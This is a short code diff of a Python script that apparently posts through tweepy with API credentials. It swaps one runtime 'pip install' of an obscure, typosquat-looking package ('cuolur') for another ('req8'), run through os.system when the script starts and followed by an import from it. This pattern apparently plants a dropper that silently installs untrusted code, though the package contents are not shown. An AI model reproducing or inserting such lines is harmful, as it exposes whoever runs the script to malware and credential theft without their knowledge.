@@ -1,6 +1,6 @@
 import os
-os.system("pip install cuolur")
-from cuolur import visual
+os.system("pip install req8")
+from req8 import websocket
 import tweepy
 
 # Replace these with your own API credentials
